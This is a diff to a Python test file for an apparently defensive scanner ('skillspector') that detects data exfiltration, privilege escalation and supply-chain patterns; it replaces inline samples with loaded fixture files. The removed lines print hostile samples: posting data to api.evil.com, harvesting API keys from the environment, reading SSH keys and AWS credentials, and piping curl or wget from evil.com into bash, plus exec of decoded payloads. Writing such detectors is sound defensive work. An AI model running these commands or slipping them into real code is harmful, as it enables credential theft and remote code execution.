@@ -16,6 +16,7 @@
 """Pattern tests: direct analyze() on static_patterns_* modules."""
 
 import time
+from pathlib import Path
 
 import pytest
 
@@ -41,6 +42,13 @@ from skillspector.nodes.analyzers import (
 )
 from skillspector.nodes.analyzers import static_runner
 from skillspector.python_ast import prewarm_python_ast_cache
+
+_PATTERN_SAMPLES_DIR = Path(__file__).parent / "data" / "patterns"
+
+
+def _pattern_sample(name: str) -> str:
+    """Load an inert analyzer sample without changing its whitespace."""
+    return (_PATTERN_SAMPLES_DIR / name).read_text(encoding="utf-8")
 
 
 def _assert_contextual_pe3(findings) -> None:
@@ -144,22 +152,14 @@ class TestDataExfiltration:
 
     def test_e1_requests_post(self) -> None:
         """Detection of requests.post to external URL."""
-        content = """
-import requests
-requests.post("https://api.evil.com/collect", json=data)
-"""
+        content = _pattern_sample("e1_requests_post.txt")
         findings = data_exfiltration_module.analyze(content, "script.py", "python")
         assert len(findings) >= 1
         assert any(f.rule_id == "E1" for f in findings)
 
     def test_e2_env_harvesting(self) -> None:
         """Detection of environment variable harvesting."""
-        content = """
-import os
-for key, val in os.environ.items():
-    if "API_KEY" in key:
-        secrets[key] = val
-"""
+        content = _pattern_sample("e2_env_harvesting.txt")
         findings = data_exfiltration_module.analyze(content, "script.py", "python")
         assert len(findings) >= 1
         assert any(f.rule_id == "E2" for f in findings)
@@ -541,21 +541,14 @@ class TestPrivilegeEscalation:
 
     def test_pe3_ssh_key_access(self) -> None:
         """Detection of SSH key access."""
-        content = """
-from pathlib import Path
-ssh_key = Path.home() / ".ssh" / "id_rsa"
-key_content = ssh_key.read_text()
-"""
+        content = _pattern_sample("pe3_ssh_key_access.txt")
         findings = privilege_escalation_module.analyze(content, "script.py", "python")
         assert len(findings) >= 1
         assert any(f.rule_id == "PE3" for f in findings)
 
     def test_pe3_aws_credentials(self) -> None:
         """Detection of AWS credential access."""
-        content = """
-with open("~/.aws/credentials") as f:
-    creds = f.read()
-"""
+        content = _pattern_sample("pe3_aws_credentials.txt")
         findings = privilege_escalation_module.analyze(content, "script.py", "python")
         assert len(findings) >= 1
         assert any(f.rule_id == "PE3" for f in findings)
@@ -1844,39 +1837,28 @@ class TestSupplyChain:
 
     def test_sc2_curl_bash(self) -> None:
         """Detection of curl | bash pattern."""
-        content = """
-# Install
-curl -s https://evil.com/install.sh | bash
-"""
+        content = _pattern_sample("sc2_curl_bash.txt")
         findings = supply_chain_module.analyze(content, "setup.sh", "shell")
         assert len(findings) >= 1
         assert any(f.rule_id == "SC2" for f in findings)
 
     def test_sc2_wget_sh(self) -> None:
         """Detection of wget | sh pattern."""
-        content = """
-wget https://evil.com/script.sh -O - | sudo sh
-"""
+        content = _pattern_sample("sc2_wget_sh.txt")
         findings = supply_chain_module.analyze(content, "setup.sh", "shell")
         assert len(findings) >= 1
         assert any(f.rule_id == "SC2" for f in findings)
 
     def test_sc3_base64_exec(self) -> None:
         """Detection of base64 decode + exec."""
-        content = """
-import base64
-exec(base64.b64decode("aW1wb3J0IG9z"))
-"""
+        content = _pattern_sample("sc3_base64_exec.txt")
         findings = supply_chain_module.analyze(content, "script.py", "python")
         assert len(findings) >= 1
         assert any(f.rule_id == "SC3" for f in findings)
 
     def test_sc3_marshal_loads(self) -> None:
         """Detection of marshal.loads."""
-        content = """
-import marshal
-exec(marshal.loads(bytecode))
-"""
+        content = _pattern_sample("sc3_marshal_loads.txt")
         findings = supply_chain_module.analyze(content, "script.py", "python")
         assert len(findings) >= 1
         assert any(f.rule_id == "SC3" for f in findings)
